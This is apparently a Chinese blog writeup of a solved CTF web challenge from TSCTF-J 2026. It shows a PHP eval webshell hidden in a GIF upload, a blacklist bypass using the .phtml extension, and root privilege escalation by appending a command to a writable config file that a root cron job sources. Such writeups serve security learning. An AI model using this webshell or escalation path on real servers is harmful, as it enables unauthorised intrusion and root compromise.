---
title: 【补充】TSCTF-J 2026 Writeup
published: 2026-10-17
tags:
  - CTF
  - WP
category: CTF
draft: false
---

对 **TSCTF-J 2026** 未解出题目的补充WP ~~（在努力做题了）~~

该文章会一直更新到做不动为止 ~~（大概）~~

# **web题**

## **题目：玛德莱娜小蛋糕**

![alt text](/posts-images/【补充】TSCTF-J-2026-Writeup/image-1.png)

进入主页面发现一个 *存入相册* 的按钮，考虑到这是一个低难度web题，猜测是一句话木马类型。

先用dirsearch进行扫描，只得到三个301响应的端口/assets,/data,/storage

尝试访问但是均被 403 Forbidden，那应该不会存在相关文件 ~~（其实是网络炸了扫不了了）~~

再用arjun盲扫一下网页也只返回唯一一个表单参数photo，所以先不考虑LFI文件包含，排除该方向。

回到上传文件本身

新建一个gif文件，写入木马（我们使用短标签 `<?` ，因为 `<?php` 被WAF）

```shell.gif
GIF89a<? @eval($_POST['ant']); ?>
```

通过brup上传，抓包改php文件类型

发现 `php / php5 / phar / php7` 被拒，

`.phtml、.pht、.shtml、.cgi、.htaccess` 等原样保存

使用 `.phtml` 上传文件，文件被转存为 **随机数+.phtml** 的格式，并且可静态访问

```url
http://53665a4675446e5473505a497a45326f464336546d-p80.chal.buptmerak.cn/storage/tmp/08767c30da72.phtml?c=id
```

尝试使用蚁剑进入文件夹，成功

![alt text](/posts-images/玛德莱娜小蛋糕WP/image.png)

不过浏览了一会发现报错了，回到网页发现404，结合tmp路径，猜测文件被清理

所以重复过程，速战速决。

在根目录发现不可修改的`entrypoint.sh`，进去找找提示

```entrypoint.sh
#!/bin/bash
# NOTE: intentionally NO `set -e`.
# This script must always reach `exec apache2-foreground`, otherwise the
# container exits, the platform drops the gateway route, and the browser only
# shows a confusing "ERR_CONNECTION_CLOSED" with no way to see why.
# A reachable-but-misconfigured instance is far easier to debug than a
# crash-looping one.
set -uo pipefail

# ---------------------------------------------------------------------------
# 1) Persist the platform-injected flag as a root-only file.
#    Never write a fallback value: a fixed flag would be a free flag for
#    everyone, which is worse than having no flag at all.
# ---------------------------------------------------------------------------
if [ -z "${FLAG:-}" ]; then
    echo "[entrypoint] ==========================================================" >&2
    echo "[entrypoint] ERROR: FLAG is empty / was not injected by the platform." >&2
    echo "[entrypoint] /flag will NOT be created -> nobody can obtain the flag." >&2
    echo "[entrypoint] Fix: choose 动态flag(Leet 或 UUID) and click 保存&编译." >&2
    echo "[entrypoint] Continuing WITHOUT /flag so this instance stays reachable" >&2
    echo "[entrypoint] (you should still see the upload page when you open it)." >&2
    echo "[entrypoint] ==========================================================" >&2
else
    if printf '%s\n' "$FLAG" > /flag; then
        chown root:root /flag 2>/dev/null || true
        chmod 600 /flag 2>/dev/null || true
    else
        echo "[entrypoint] ERROR: could not write /flag (read-only mount?)." >&2
        echo "[entrypoint]        If the platform injects the flag another way, make" >&2
        echo "[entrypoint]        sure that file is still root-only (0600)." >&2
    fi

    # Remove FLAG from the environment BEFORE anything long-lived starts, so it
    # can never show up in /proc/<pid>/environ:
    #   - `service cron start` forks a daemon that would otherwise inherit it
    #     (and pass it on to every cron job, including the ones the player
    #     triggers);
    #   - the final `exec` replaces PID 1, so /proc/1/environ is clean too.
    unset FLAG
fi

# ---------------------------------------------------------------------------
# 2) cron is the intended solution path. If the runtime refuses to run it the
#    challenge becomes unsolvable, so make that loud -- but do not kill the
#    container over it.
# ---------------------------------------------------------------------------
if ! service cron start; then
    echo "[entrypoint] WARNING: 'service cron start' failed; the challenge will be unsolvable" >&2
fi
if command -v pgrep >/dev/null 2>&1 && ! pgrep -x cron >/dev/null 2>&1; then
    echo "[entrypoint] WARNING: cron daemon is not running; the challenge will be unsolvable" >&2
fi

# ---------------------------------------------------------------------------
# 3) exec: PID 1 must be apache itself (not this shell), which also gives it a
#    freshly built environment block with no FLAG entry.
# ---------------------------------------------------------------------------
if [ -f /flag ]; then
    echo "[entrypoint] starting apache (flag file: present, $(stat -c '%A %U:%G' /flag 2>/dev/null))" >&2
else
    echo "[entrypoint] starting apache (flag file: MISSING -> this instance is broken)" >&2
fi
exec apache2-foreground
```

可以发现有很多注释和flag相关内容，看43段

    # 2) cron is the intended solution path. If the runtime refuses to run it the
    challenge becomes unsolvable, so make that loud -- but do not kill the
    container over it.

可知 **cron（定时任务）** 是预期的解题路径

去到`/etc`找到一个`cron.d`文件夹，里面有`teahouse-cleanup`文件，写着

```teahouse-cleanup
* * * * * root /bin/bash /opt/teahouse/bin/clean_uploads.sh >> /var/log/
teahouse-cleanup.log 2>&1
```

这个复写是以 **root** 权限运行的，也许可以利用一下。

再去到`/opt/teahouse/bin/clean_uploads.sh`，里面写着

```clean_uploads.sh
#!/bin/bash
set -u

UPLOAD_DIR="/var/www/html/storage/tmp"
PROFILE_FILE="/var/lib/teahouse/cleanup.conf"

if [ ! -d "$UPLOAD_DIR" ]; then
    exit 0
fi

if [ -f "$PROFILE_FILE" ]; then
    source "$PROFILE_FILE"
fi

# The teahouse keeps albums tidy by sweeping oversized or stale temporary desserts.
find "$UPLOAD_DIR" -type f -size +"${MAX_UPLOAD_SIZE:-1M}" -delete
find "$UPLOAD_DIR" -type f -mmin +"${UPLOAD_TTL_MINUTES:-3}" -delete
```

第12段有个`source`，引用的是`/var/lib/teahouse/cleanup.conf`

由于`teahouse-cleanup`以 **root权限** 执行`clean_uploads.sh`，而`clean_uploads.sh`又以`source`执行了`cleanup.conf`，所以`cleanup.conf`就是以 **root权限** 执行的。

追踪到`/var/lib/teahouse/cleanup.conf`，发现当前权限可修改

里面写着

```cleanup.conf
MAX_UPLOAD_SIZE=1M
UPLOAD_TTL_MINUTES=3
```

我们往里面追加内容

```cleanup.conf
cat /flag > /var/www/html/storage/tmp/flagout.txt
```

目的是让`/flag`的内容写入到`flagout.txt`的文件中，过一分钟之后就有`flagout.txt`文件出现了

一分钟后打开`flagout.txt`得到 **TSCTF-J{cR07-1N_534rbH-OF-10sT-b@K3-a7d_f13Gc98433b}**

整体思路： ~~（只有此处为AI生成）~~

1. **上传木马** -> 绕过前端和黑名单，拿到 `www-data` 权限。
2. **信息收集** -> 阅读 `entrypoint.sh`，发现 Cron 提权是官方指定路线。
3. **寻找弱点** -> 发现 `cleanup.conf` 是高权限加载（`source`）的低权限可写文件。
4. **借刀杀人** -> 把 `cat /flag > ...` 塞进配置，让 root 帮你当“搬运工”。
